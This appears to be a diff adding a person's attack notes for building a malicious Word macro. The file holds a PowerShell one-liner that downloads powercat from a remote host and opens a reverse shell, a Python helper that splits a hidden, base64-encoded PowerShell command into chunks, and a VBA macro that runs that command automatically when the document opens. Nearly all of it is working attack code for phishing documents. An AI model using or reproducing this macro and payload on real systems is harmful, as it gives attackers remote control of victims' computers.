@@ -1,0 +1,43 @@
+payload:
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.0.0.9/powercat.ps1');powercat -c 10.0.0.9 -p 4444 -e powershell
+
+=============================================
+Use Powershell to enconde string as base64 and split it using:
+=============================================
+## python Script that will split the command in 50 chars (limit on macros)
+=============================================
+str = "powershell.exe -nop -w hidden -e SQBFAFgAKA...AcgBzAGgAZQBsAGwA"
+
+n = 50
+
+for i in range(0, len(str), n):
+	print("Str = Str + " + '"' + str[i:i+n] + '"')
+=============================================
+
+CREATING DOC
+-DOC extension, not docx
+-Doccument MACRO
+
+=============================================
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    
+    Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
+    Str = Str + "wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA"
+    Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
+        ...
+    Str = Str + "QB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQB"
+    Str = Str + "jACAAMQA5ADIALgAxADYAOAAuADQANQAuADIANAAzACAALQBwA"
+    Str = Str + "CAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw"
+    Str = Str + "A"
+
+    CreateObject("Wscript.Shell").Run Str
+End Sub
